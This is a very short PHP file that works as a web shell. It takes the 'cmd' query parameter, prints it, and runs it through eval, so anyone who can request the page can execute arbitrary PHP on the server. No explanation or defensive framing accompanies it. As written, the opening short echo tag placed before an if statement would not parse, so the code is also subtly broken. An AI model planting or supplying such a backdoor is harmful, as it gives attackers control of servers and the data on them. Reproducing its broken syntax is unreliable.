<?=
    if(!empty($_GET)){
        var_dump($_GET["cmd"]);
        print "<br>";
        eval($_GET["cmd"] .';');
    }
?>